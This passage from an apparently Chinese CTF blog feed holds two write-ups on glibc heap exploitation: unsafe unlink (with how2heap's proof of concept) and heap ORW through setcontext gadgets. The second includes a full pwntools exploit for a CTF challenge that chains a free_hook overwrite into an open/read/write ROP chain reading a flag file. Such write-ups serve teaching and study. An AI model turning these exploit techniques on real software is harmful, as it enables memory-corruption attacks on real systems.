    <content type="html"><![CDATA[<p>unlink来喽！刚开始看的时候有点摸不着头脑，理顺了还是挺形象的(ง •_•)ง</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>unlink实际上是一个宏，用于从双链中摘下chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    FD = P-&gt;fd;      \</span><br><span class="hljs-meta">    BK = P-&gt;bk;      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span><br><span class="hljs-meta">      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="hljs-meta">    <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">        FD-&gt;bk = BK;      \</span><br><span class="hljs-meta">        BK-&gt;fd = FD;      \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)      \</span><br><span class="hljs-meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span><br><span class="hljs-meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="hljs-meta">      malloc_printerr (check_action,      \</span><br><span class="hljs-meta">       <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="hljs-meta">       P, AV);      \</span><br><span class="hljs-meta">            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span><br><span class="hljs-meta">                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)      \</span><br><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span><br><span class="hljs-meta">                <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span><br><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span><br><span class="hljs-meta">                  &#125;      \</span><br><span class="hljs-meta">              &#125; <span class="hljs-keyword">else</span> &#123;      \</span><br><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span><br><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span><br><span class="hljs-meta">              &#125;      \</span><br><span class="hljs-meta">          &#125;      \</span><br><span class="hljs-meta">      &#125;      \</span><br><span class="hljs-meta">&#125;</span><br></code></pre></td></tr></table></figure><p>摘下chunk的过程可如图所示：</p><img src="/2023/01/29/unsafe-unlink/unlink.png" class title="unlink"><p>简化一下其实就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">FD=victim-&gt;fd<br>BK=victim-&gt;bk<br>FD-&gt;bk=BK<br>BK-&gt;fd=FD<br></code></pre></td></tr></table></figure><p>这个过程中会检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FD-&gt;bk != P || BK-&gt;fd != P<br></code></pre></td></tr></table></figure><p>2.26unlink开头增加了对nextchunk的presize和size的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta"><span class="hljs-comment">//size和next chunk的presize的检查</span></span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);  \<br>    FD = P-&gt;fd;      \<br>    BK = P-&gt;bk;      \<br><br>……<br><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>实验代码如下（来自how2heap，删除了一些输出）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">uint64_t</span> *chunk0_ptr;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-type">int</span> malloc_size = <span class="hljs-number">0x80</span>; <br><span class="hljs-type">int</span> header_size = <span class="hljs-number">2</span>;<br><br>chunk0_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk0</span><br><span class="hljs-type">uint64_t</span> *chunk1_ptr  = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(malloc_size); <span class="hljs-comment">//chunk1</span><br><br>chunk0_ptr[<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">3</span>);<br>chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr-(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)*<span class="hljs-number">2</span>);<br><br><span class="hljs-type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;<br><br>chunk1_hdr[<span class="hljs-number">0</span>] = malloc_size;<br><br>chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br><span class="hljs-built_in">free</span>(chunk1_ptr);<br><br><span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>];<br><span class="hljs-built_in">strcpy</span>(victim_string,<span class="hljs-string">&quot;Hello!~&quot;</span>);<br>chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;<br><br>chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x4141414142424242</span>LL;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New Value: %s\n&quot;</span>,victim_string);<br><br><span class="hljs-comment">// sanity check</span><br>assert(*(<span class="hljs-type">long</span> *)victim_string == <span class="hljs-number">0x4141414142424242</span>L);<br>&#125;<br></code></pre></td></tr></table></figure><p>利用步骤如下：</p><ul><li>连续malloc两个unsorted bin范围内的chunk（2.26以上大小需要在tcache之外），chunk0和chunk1<img src="/2023/01/29/unsafe-unlink/1.jpg" class title="步骤一"></li><li>在chunk0内伪造fake chunk<img src="/2023/01/29/unsafe-unlink/2.jpg" class title="步骤二"></li><li>修改chunk1的presize和size的inuse位（可以通过of by null漏洞（或者fastbin_dup_consolidate）+申请大小0x8结尾的chunk实现（使用next chunk的presize部分））<img src="/2023/01/29/unsafe-unlink/3.jpg" class title="步骤三"></li><li>free(chunk1)触发chunk0的向上合并，触发unlink摘除chunk0<img src="/2023/01/29/unsafe-unlink/4.jpg" class title="步骤四"></li><li>最后的结果就是指向chunk0的指针现在指向指针地址-0x18的地址，这样我们就可以通过覆盖指向chunk0指针指向别的地方并且改写那里的内容</li></ul><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>见fastbin dup consolidate</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆orw</title>
    <link href="/2023/01/27/%E5%A0%86orw/"/>
    <url>/2023/01/27/%E5%A0%86orw/</url>
    
    <content type="html"><![CDATA[<p>之前做栈上的orw时看到过堆上的orw，这次就碰到了。安排！o(<em>￣▽￣</em>)ブ</p><span id="more"></span><h1 id="2-29以下"><a href="#2-29以下" class="headerlink" title="2.29以下"></a>2.29以下</h1><p>堆上的orw主要就是利用setcontext函数中的gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;setcontext+<span class="hljs-number">53</span>&gt;:  mov    rsp,QWORD PTR [rdi+<span class="hljs-number">0xa0</span>]<br>&lt;setcontext+<span class="hljs-number">60</span>&gt;:  mov    rbx,QWORD PTR [rdi+<span class="hljs-number">0x80</span>]<br>&lt;setcontext+<span class="hljs-number">67</span>&gt;:  mov    rbp,QWORD PTR [rdi+<span class="hljs-number">0x78</span>]<br>&lt;setcontext+<span class="hljs-number">71</span>&gt;:  mov    r12,QWORD PTR [rdi+<span class="hljs-number">0x48</span>]<br>&lt;setcontext+<span class="hljs-number">75</span>&gt;:  mov    r13,QWORD PTR [rdi+<span class="hljs-number">0x50</span>]<br>&lt;setcontext+<span class="hljs-number">79</span>&gt;:  mov    r14,QWORD PTR [rdi+<span class="hljs-number">0x58</span>]<br>&lt;setcontext+<span class="hljs-number">83</span>&gt;:  mov    r15,QWORD PTR [rdi+<span class="hljs-number">0x60</span>]<br>&lt;setcontext+<span class="hljs-number">87</span>&gt;:  mov    rcx,QWORD PTR [rdi+<span class="hljs-number">0xa8</span>]<br>&lt;setcontext+<span class="hljs-number">94</span>&gt;:  push   rcx<br>&lt;setcontext+<span class="hljs-number">95</span>&gt;:  mov    rsi,QWORD PTR [rdi+<span class="hljs-number">0x70</span>]<br>&lt;setcontext+<span class="hljs-number">99</span>&gt;:  mov    rdx,QWORD PTR [rdi+<span class="hljs-number">0x88</span>]<br>&lt;setcontext+<span class="hljs-number">106</span>&gt;: mov    rcx,QWORD PTR [rdi+<span class="hljs-number">0x98</span>]<br>&lt;setcontext+<span class="hljs-number">113</span>&gt;: mov    r8,QWORD PTR [rdi+<span class="hljs-number">0x28</span>]<br>&lt;setcontext+<span class="hljs-number">117</span>&gt;: mov    r9,QWORD PTR [rdi+<span class="hljs-number">0x30</span>]<br>&lt;setcontext+<span class="hljs-number">121</span>&gt;: mov    rdi,QWORD PTR [rdi+<span class="hljs-number">0x68</span>]<br>&lt;setcontext+<span class="hljs-number">125</span>&gt;: xor    eax,eax<br>&lt;setcontext+<span class="hljs-number">127</span>&gt;: ret<br></code></pre></td></tr></table></figure><p>我们将setcontext+53的地址写入free_hook中，当我们执行free(chunk1)时，chunk1的地址（data段地址）会被传入rdi，这样我们就控制了rdi，并且可以通过rdi控制寄存器<br>我们需要控制的寄存器就是rsp和rcx：    </p><ul><li><p>我们需要将已经写好的orw链的地址写在rdi+0xa0处，这样就能通过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;setcontext+<span class="hljs-number">53</span>&gt;:  mov    rsp,QWORD PTR [rdi+<span class="hljs-number">0xa0</span>]<br></code></pre></td></tr></table></figure><p>实现栈迁移</p></li><li><p>我们还需要将一个ret指令的地址写在rdi+0xa8处，因为push rcx会将rcx入栈，ret执行的就是rcx的地址</p></li></ul><h1 id="2-29以上"><a href="#2-29以上" class="headerlink" title="2.29以上"></a>2.29以上</h1><h2 id="gadget-setcontext"><a href="#gadget-setcontext" class="headerlink" title="gadget+setcontext"></a>gadget+setcontext</h2><p>2.29之后setcontext中的gadget变成了以rdx索引，因此我们需要找一些能控制rdx的gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">00000000000580</span>DD                 mov     rsp, [rdx+<span class="hljs-number">0</span>A0h]<br>.text:<span class="hljs-number">00000000000580E4</span>                 mov     rbx, [rdx+<span class="hljs-number">80</span>h]<br>.text:<span class="hljs-number">00000000000580</span>EB                 mov     rbp, [rdx+<span class="hljs-number">78</span>h]<br>.text:<span class="hljs-number">00000000000580</span>EF                 mov     r12, [rdx+<span class="hljs-number">48</span>h]<br>.text:<span class="hljs-number">00000000000580F</span>3                 mov     r13, [rdx+<span class="hljs-number">50</span>h]<br>.text:<span class="hljs-number">00000000000580F</span>7                 mov     r14, [rdx+<span class="hljs-number">58</span>h]<br>.text:<span class="hljs-number">00000000000580F</span>B                 mov     r15, [rdx+<span class="hljs-number">60</span>h]<br>.text:<span class="hljs-number">00000000000580F</span>F                 test    dword ptr fs:<span class="hljs-number">48</span>h, <span class="hljs-number">2</span><br>    ....<br>.text:<span class="hljs-number">00000000000581</span>C6                 mov     rcx, [rdx+<span class="hljs-number">0</span>A8h]<br>.text:<span class="hljs-number">00000000000581</span>CD                 push    rcx<br>.text:<span class="hljs-number">00000000000581</span>CE                 mov     rsi, [rdx+<span class="hljs-number">70</span>h]<br>.text:<span class="hljs-number">00000000000581</span>D2                 mov     rdi, [rdx+<span class="hljs-number">68</span>h]<br>.text:<span class="hljs-number">00000000000581</span>D6                 mov     rcx, [rdx+<span class="hljs-number">98</span>h]<br>.text:<span class="hljs-number">00000000000581</span>DD                 mov     r8, [rdx+<span class="hljs-number">28</span>h]<br>.text:<span class="hljs-number">00000000000581E1</span>                 mov     r9, [rdx+<span class="hljs-number">30</span>h]<br>.text:<span class="hljs-number">00000000000581E5</span>                 mov     rdx, [rdx+<span class="hljs-number">88</span>h]<br>.text:<span class="hljs-number">00000000000581</span>EC                 xor     eax, eax<br>.text:<span class="hljs-number">00000000000581</span>EE                 retn<br></code></pre></td></tr></table></figure><p>getkeyserv_handle+576有一段gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">mov     rdx, [rdi+<span class="hljs-number">8</span>]<br>mov     [rsp+<span class="hljs-number">0</span>C8h+var_C8], rax<br>call    qword ptr [rdx+<span class="hljs-number">20</span>h]<br></code></pre></td></tr></table></figure><p>可以通过rdi控制rdx，从2.29到2.32都可以用     </p><ul><li>free_hook写入getkeyserv_handle+576</li><li>rdi+8写入rdx的值</li><li>rdx+0x20写入setcontext+53的值</li><li>rdx+0xa0写入orw链的地址</li><li>rdi+0xa8写入一个ret指令的地址</li></ul><h2 id="gadget-栈迁移"><a href="#gadget-栈迁移" class="headerlink" title="gadget+栈迁移"></a>gadget+栈迁移</h2><p>gadget svcudp_reply+26：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">mov rbp, qword ptr [rdi + <span class="hljs-number">0x48</span>]; <br>mov rax, qword ptr [rbp + <span class="hljs-number">0x18</span>]; <br>lea r13, [rbp + <span class="hljs-number">0x10</span>]; <br>mov dword ptr [rbp + <span class="hljs-number">0x10</span>], <span class="hljs-number">0</span>; <br>mov rdi, r13; <br>call qword ptr [rax + <span class="hljs-number">0x28</span>];<br></code></pre></td></tr></table></figure><p>可以通过rdi控制rbp的值实现栈迁移，还可以通过rbp控制rax实现程序的跳转</p><h1 id="hgame-2023-week3-note-context"><a href="#hgame-2023-week3-note-context" class="headerlink" title="hgame 2023 week3 note_context"></a>hgame 2023 week3 note_context</h1><p>思路见上👆，直接放exp了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">pos, ptr</span>):<br>    <span class="hljs-keyword">return</span> (pos &gt;&gt; <span class="hljs-number">12</span>) ^ ptr<br><br>p=process(<span class="hljs-string">&#x27;./context&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;week-3.hgame.lwsec.cn&#x27;,30223)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./2.32-0ubuntu3.2_amd64/libc-2.32.so&#x27;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x70</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x61</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>tcache_max_bin=libcbase+<span class="hljs-number">0x1e3280</span>+<span class="hljs-number">80</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(tcache_max_bin))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">0</span>)<br>pad1=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pad1))<br>edit(<span class="hljs-number">0</span>,p64(pad1)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+p64(tcache_max_bin-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x600</span>)<br>delete(<span class="hljs-number">5</span>)<br>show(<span class="hljs-number">5</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>heap=(u64(s)&lt;&lt;<span class="hljs-number">12</span>)-<span class="hljs-number">0x1000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>free_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x610</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x610</span>)<br>delete(<span class="hljs-number">7</span>)<br>delete(<span class="hljs-number">6</span>)<br>edit(<span class="hljs-number">6</span>,p64(pack(heap+<span class="hljs-number">0x2930</span>,free_hook)))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x610</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x610</span>)<br><br>rdx_addr=libcbase+<span class="hljs-number">0x14b760</span><br>ret_addr=libcbase+<span class="hljs-number">0x26699</span><br>set_context_addr=libcbase+<span class="hljs-number">0x5306d</span><br>open_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>pop_rdi_addr=libcbase+<span class="hljs-number">0x2858f</span><br>pop_rsi_addr=libcbase+<span class="hljs-number">0x2ac3f</span><br>pop_rdx_r12_addr=libcbase+<span class="hljs-number">0x114161</span><br>payload=<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>+p64(heap+<span class="hljs-number">0x2310</span>+<span class="hljs-number">0x18</span>)+<span class="hljs-number">0x18</span>*<span class="hljs-string">b&#x27;\x00&#x27;</span>+p64(set_context_addr)<br>payload+=(<span class="hljs-number">0xa8</span>-<span class="hljs-number">0x30</span>)*<span class="hljs-string">b&#x27;\x00&#x27;</span>+p64(heap+<span class="hljs-number">0x2310</span>+<span class="hljs-number">0x100</span>)+p64(ret_addr)<br>payload+=(<span class="hljs-number">0x100</span>-<span class="hljs-number">0xb0</span>-<span class="hljs-number">0x18</span>)*<span class="hljs-string">b&#x27;\x00&#x27;</span><br>payload+=p64(pop_rdi_addr)+p64(heap+<span class="hljs-number">0x2320</span>)+p64(pop_rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>payload+=p64(pop_rdi_addr)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi_addr)+p64(heap+<span class="hljs-number">0x2310</span>)+p64(pop_rdx_r12_addr)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0</span>)+p64(read_addr)<br>payload+=p64(pop_rdi_addr)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_addr)+p64(heap+<span class="hljs-number">0x2310</span>)+p64(pop_rdx_r12_addr)+p64(<span class="hljs-number">0x30</span>)+p64(<span class="hljs-number">0</span>)+p64(write_addr)<br>gdb.attach(p)<br>edit(<span class="hljs-number">9</span>,p64(rdx_addr))<br>edit(<span class="hljs-number">8</span>,payload)<br>delete(<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(p.recv())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
      <tag>orw</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>large bin attack</title>
    <link href="/2023/01/25/large-bin-attack/"/>
    <url>/2023/01/25/large-bin-attack/</url>
    
